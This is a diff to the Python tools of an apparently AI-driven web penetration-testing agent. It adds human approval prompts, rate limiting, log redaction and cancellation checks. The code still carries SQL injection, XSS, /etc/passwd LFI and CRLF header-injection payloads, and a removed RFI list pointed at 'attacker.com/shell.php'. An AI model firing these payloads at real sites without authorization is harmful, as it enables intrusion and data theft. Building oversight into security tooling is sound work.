@@ -13,10 +13,22 @@ from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from crewai.tools import tool
 from typing import Dict, List, Any
-from urllib.parse import quote, parse_qs
+from urllib.parse import quote, parse_qs, urlparse
 import time
 
+from checkpoint import require_approval
+from rate_limiter import rate_limiter
+from redact import redact
+from cancellation import check_cancelled
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+def _domain_of(url: str) -> str:
+    try:
+        return urlparse(url).netloc.split(":")[0].lower()
+    except Exception:
+        return url
 
 # ==========================================
 # GLOBAL EXECUTION LOGGER (Thread-Safe)
@@ -27,14 +39,14 @@ class ExecutionLogger:
         self.lock = threading.Lock()
     
     def add_log(self, tool_name: str, status: str, message: str, details: Dict = None):
-        """Log hasil eksekusi tool dengan timestamp"""
+        """Log hasil eksekusi tool dengan timestamp — data sensitif di-redact dulu."""
         with self.lock:
             log_entry = {
                 "timestamp": datetime.now().isoformat(),
                 "tool": tool_name,
-                "status": status, 
-                "message": message,
-                "details": details or {}
+                "status": status,
+                "message": redact(message),
+                "details": redact(details or {})
             }
             self.logs.append(log_entry)
             print(f"[LOG] {log_entry}")
@@ -96,6 +108,7 @@ def recon_target(url: str) -> str:
     """
     tool_name = "Active Recon Target"
     exec_logger.add_log(tool_name, "START", f"Memulai deep recon untuk {url}")
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
     
     try:
         print(f"\n[🔍 DEEP RECON] Menganalisis medan tempur: {url}...")
@@ -194,7 +207,19 @@ def scan_sql_injection(url: str, params: str = "") -> str:
     """
     tool_name = "SQL Injection Scanner"
     exec_logger.add_log(tool_name, "START", f"Memulai SQLi scan pada {url}")
-    
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    approved = require_approval(
+        action=f"SQL Injection scan pada {url}",
+        context=f"Params: {params or 'default (id,q,search)'}",
+        risk="medium",
+        exec_logger=exec_logger,
+    )
+    if not approved:
+        exec_logger.add_log(tool_name, "BLOCKED", "Scan dibatalkan: approval ditolak/timeout/no-context")
+        return "SCAN DIBATALKAN: human-in-the-loop approval ditolak atau timeout."
+
+    domain = _domain_of(url)
     try:
         sql_payloads = [
             "' OR '1'='1",
@@ -213,6 +238,7 @@ def scan_sql_injection(url: str, params: str = "") -> str:
         for param in param_list:
             for payload in sql_payloads:
                 try:
+                    rate_limiter.wait(domain)
                     test_url = f"{url}?{param}={quote(payload)}"
                     response = requests.get(test_url, timeout=5, verify=False)
                     
@@ -259,7 +285,19 @@ def detect_xss_csrf(url: str) -> str:
     """
     tool_name = "XSS & CSRF Detector"
     exec_logger.add_log(tool_name, "START", f"Memulai XSS/CSRF detection pada {url}")
-    
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    approved = require_approval(
+        action=f"XSS/CSRF scan pada {url}",
+        context="Mengirim payload script reflected-XSS ke parameter 'test'",
+        risk="medium",
+        exec_logger=exec_logger,
+    )
+    if not approved:
+        exec_logger.add_log(tool_name, "BLOCKED", "Scan dibatalkan: approval ditolak/timeout/no-context")
+        return "SCAN DIBATALKAN: human-in-the-loop approval ditolak atau timeout."
+
+    domain = _domain_of(url)
     try:
         xss_payloads = [
             "<script>alert(1)</script>",
@@ -280,6 +318,7 @@ def detect_xss_csrf(url: str) -> str:
         # Test XSS
         for payload in xss_payloads:
             try:
+                rate_limiter.wait(domain)
                 test_url = f"{url}?test={quote(payload)}"
                 response = requests.get(test_url, timeout=5, verify=False)
                 
@@ -322,6 +361,7 @@ def analyze_ssl_tls(domain: str) -> str:
     """
     tool_name = "SSL/TLS Analyzer"
     exec_logger.add_log(tool_name, "START", f"Menganalisis SSL/TLS untuk {domain}")
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
     
     try:
         exec_logger.add_log(tool_name, "PROCESSING", "Connecting ke server dan extracting certificate")
@@ -376,6 +416,7 @@ def enumerate_dns_subdomains(domain: str) -> str:
     """
     tool_name = "DNS & Subdomain Enumerator"
     exec_logger.add_log(tool_name, "START", f"Memulai DNS enumeration untuk {domain}")
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
     
     try:
         exec_logger.add_log(tool_name, "PROCESSING", "Querying DNS records (A, MX, NS, TXT)")
@@ -444,6 +485,7 @@ def analyze_password_strength(password: str) -> str:
     """
     tool_name = "Password Strength Analyzer"
     exec_logger.add_log(tool_name, "START", f"Analyzing password strength")
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
     
     try:
         exec_logger.add_log(tool_name, "PROCESSING", "Calculating entropy and checking patterns")
@@ -524,6 +566,7 @@ def test_api_security(api_url: str, method: str = "GET") -> str:
     """
     tool_name = "API Security Tester"
     exec_logger.add_log(tool_name, "START", f"Testing API security pada {api_url}")
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
     
     try:
         findings = {
@@ -603,7 +646,19 @@ def scan_lfi_rfi(url: str, param: str = "file") -> str:
     """
     tool_name = "LFI/RFI Scanner"
     exec_logger.add_log(tool_name, "START", f"Scanning LFI/RFI pada {url}")
-    
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    approved = require_approval(
+        action=f"LFI/RFI scan pada {url}",
+        context=f"param={param}, termasuk percobaan akses /etc/passwd dan RFI ke canary domain",
+        risk="medium",
+        exec_logger=exec_logger,
+    )
+    if not approved:
+        exec_logger.add_log(tool_name, "BLOCKED", "Scan dibatalkan: approval ditolak/timeout/no-context")
+        return "SCAN DIBATALKAN: human-in-the-loop approval ditolak atau timeout."
+
+    domain = _domain_of(url)
     try:
         lfi_payloads = [
             "../../../../etc/passwd",
@@ -613,10 +668,14 @@ def scan_lfi_rfi(url: str, param: str = "file") -> str:
             "file:///etc/passwd"
         ]
         
+        # PENTING: jangan pakai domain pihak ketiga beneran (mis. attacker.com) di
+        # sini. Ganti CANARY_DOMAIN ke domain/Burp Collaborator yang LO kontrol,
+        # biar kalau RFI berhasil, callback-nya ketauan dan gak ngirim traffic ke
+        # infrastruktur orang lain tanpa izin.
+        CANARY_DOMAIN = "your-canary-domain.example"  # TODO: ganti sebelum dipakai
         rfi_payloads = [
-            "http://attacker.com/shell.php",
-            "https://attacker.com/payload.txt",
-            "ftp://attacker.com/file.txt"
+            f"http://{CANARY_DOMAIN}/rfi-test-shell.php",
+            f"https://{CANARY_DOMAIN}/rfi-test-payload.txt",
         ]
         
         findings = {
@@ -628,6 +687,7 @@ def scan_lfi_rfi(url: str, param: str = "file") -> str:
         exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(lfi_payloads)} LFI payloads")
         for payload in lfi_payloads:
             try:
+                rate_limiter.wait(domain)
                 test_url = f"{url}?{param}={quote(payload)}"
                 response = requests.get(test_url, timeout=5, verify=False)
                 
@@ -645,6 +705,7 @@ def scan_lfi_rfi(url: str, param: str = "file") -> str:
         exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(rfi_payloads)} RFI patterns")
         for payload in rfi_payloads:
             try:
+                rate_limiter.wait(domain)
                 test_url = f"{url}?{param}={quote(payload)}"
                 response = requests.get(test_url, timeout=5, verify=False)
                 
@@ -680,7 +741,19 @@ def test_header_injection(url: str) -> str:
     """
     tool_name = "Header Injection Tester"
     exec_logger.add_log(tool_name, "START", f"Testing header injection pada {url}")
-    
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    approved = require_approval(
+        action=f"Header injection test pada {url}",
+        context="Mengirim CRLF/null-byte payload via custom headers",
+        risk="low",
+        exec_logger=exec_logger,
+    )
+    if not approved:
+        exec_logger.add_log(tool_name, "BLOCKED", "Test dibatalkan: approval ditolak/timeout/no-context")
+        return "TEST DIBATALKAN: human-in-the-loop approval ditolak atau timeout."
+
+    domain = _domain_of(url)
     try:
         injection_payloads = {
             "CRLF": "\r\nX-Injected: true",
@@ -698,6 +771,7 @@ def test_header_injection(url: str) -> str:
         
         for injection_type, payload in injection_payloads.items():
             try:
+                rate_limiter.wait(domain)
                 # Test dengan custom header
                 headers = {
                     "User-Agent": f"Mozilla/5.0{payload}",
@@ -736,6 +810,7 @@ def baca_log_burp(file_path: str) -> str:
     """Membaca file hasil export HTTP History dari Burp Suite (format JSON)."""
     tool_name = "Baca Log Burp Suite"
     exec_logger.add_log(tool_name, "START", f"Reading Burp log dari {file_path}")
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
     
     try:
         with open(file_path, 'r') as file:
@@ -768,12 +843,24 @@ def tembak_payload(url: str, method: str, headers_json: str, body_data: str) -> 
     """Mengirim HTTP request (payload) secara langsung ke target."""
     tool_name = "Tembak Request HTTP"
     exec_logger.add_log(tool_name, "START", f"Executing {method} request to {url}")
-    
+    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    approved = require_approval(
+        action=f"{method.upper()} request ke {url}",
+        context=f"Headers: {headers_json}\nBody: {body_data[:300]}",
+        risk="high",
+        exec_logger=exec_logger,
+    )
+    if not approved:
+        exec_logger.add_log(tool_name, "BLOCKED", "Request dibatalkan: approval ditolak/timeout/no-context")
+        return "EKSEKUSI DIBATALKAN: human-in-the-loop approval ditolak atau timeout. Tidak ada request yang dikirim."
+
     try:
         headers = json.loads(headers_json) if headers_json else {}
         if "User-Agent" not in headers:
             headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
 
+        rate_limiter.wait(_domain_of(url))
         exec_logger.add_log(tool_name, "PROCESSING", f"Sending {method} payload")
         
         if method.upper() == 'GET':
